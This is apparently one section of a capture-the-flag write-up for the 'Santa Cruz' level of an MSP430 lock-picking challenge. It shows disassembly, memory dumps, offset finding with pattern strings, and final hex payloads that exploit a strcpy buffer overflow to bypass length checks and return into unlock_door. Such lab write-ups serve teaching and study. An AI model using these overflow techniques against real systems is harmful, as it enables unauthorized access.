## 10. Santa Cruz

**Objective:** Buffer overflow

At the beginning of this challenge, there are some bytes set in memory.
```
455c:  c443 faff      mov.b	#0x0, -0x6(r4)
4560:  f442 e7ff      mov.b	#0x8, -0x19(r4)
4564:  f440 1000 e8ff mov.b	#0x10, -0x18(r4
```

A null byte, and two bytes with the values of 0x8 (8) and 0x10 (16). These are most likely the lower and upper bounds for the lengths of the username and password.

The program continues by using gets with a 0x63 (99) byte limit to read into a buffer, and then uses strcpy to copy the input strings to somewhere else in memory. There could be a buffer overflow vulnerability here.

Afterwards, it does the bounds checking using those bytes it set before. 

Let's investigate a little bit further using a test of username=admin and password=changeme.

After the second strcpy, there is a loop where a string is being read and a register r14 is being incremented. After the loop ends, the length of the number of bytes read is stored in r11.
```
45d8:  1e53           inc	r14
45da:  ce93 0000      tst.b	0x0(r14)
45de:  fc23           jnz	#0x45d8 <login+0x88>
45e0:  0b4e           mov	r14, r11
```

If we put a breakpoint at 0x45da, we can see that the contents of r14 contain the memory address of our password!

```
43b5:   6368 616e 6765 6d65  changeme
```
It seems like it's only checking the bounds on the password:

```
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	#0x45fa <login+0xaa>
. . .
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
45fe:  8f11           sxt	r15
4600:  0b9f           cmp	r15, r11
4602:  062c           jc	#0x4610 <login+0xc0>
```

Let's try to overflow the username and see what we can write in memory!

After setting a break point after the first strcpy, We overflow the username using a pattern string of 99 bytes. If we check the memory contents of those bounds checking bytes that were set earlier, we find that they now point to our string at the 18th offset.

```
Contents of (-0x19)r4:
43b3:   3541 6136 4161 3741  5Aa6Aa7A
```

So now we can replace the 18th to 21st byte with our new password bounds. Let's use 0x01 for the lower bound and 0xff for the upper bound. This will allow passwords between 1-255 characters. 

**Note**: We cannot use 00 for the lower bound because this will be considered a null byte by strcpy and our whole payload won't be copied to memory!

Modifying our existing payload to contain the bytes 01ff at the 18th position, we should sail through any of the bounds checks. Let's try a password of "B" since it has to be at least one character long. 

We'll set a breakpoint at 0x464c as that is the final check before main returns.

```
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>
```

If we inspect memory, we find that the null byte has been overwritten by our payload. We will fail this check and the program will terminate.

```
43c6:   4162 3241 6233 4162  Ab2Ab3Ab
```

So how do we pass this check? If we try to insert the null byte in the payload, we will pass the check, but the bytes that follow will not be copied due to strcpy. But we can have arbitrary length passwords now, so let's try overflowing the password as well. If we can figure out where the null byte should be, then the password should just be one character shorter.

Overflowing the password and checking the memory reveals the nullbyte is at position 18 in our pattern string. I guess we didn't need as many as 255 characters, after all.

In order to pass the last check, we use the same payload for the username as before, and a payload of 17 junk bytes for the password. This will ensure the null byte gets added at the end as the 18th byte exactly where it needs to be without clobbering the rest of our payload.

```
43c6:   0062 3241 6233 4162  .b2Ab3Ab
43ce:   3441 6235 4162 3641  4Ab5Ab6A
43d6:   6237 4162 3841 6239  b7Ab8Ab9
43de:   4163 3041 6331 4163  Ac0Ac1Ac
```
Now, let's set a breakpoint at the end of main to see where sp is pointing. Once we know which offset in our payload it is pointing to, we can redirect it to 0x444a, i.e. unlock_door.

At the end of main, sp points to the 43rd byte in our pattern string.

```
Contents of sp:
43cc:   4162 3441 6235 4162  Ab4Ab5Ab
```

Our final payloads will be the following:

Username:
- 17 bytes of junk
- 01ff
- 23 bytes of junk
- 4a44

Password:
- 17 bytes of junk

**Flag (username):** 
4141414141414141414141414141414141**01ff**4343434343434343434343434343434343434343434343**4a44**

**Flag (password):**
4242424242424242424242424242424242
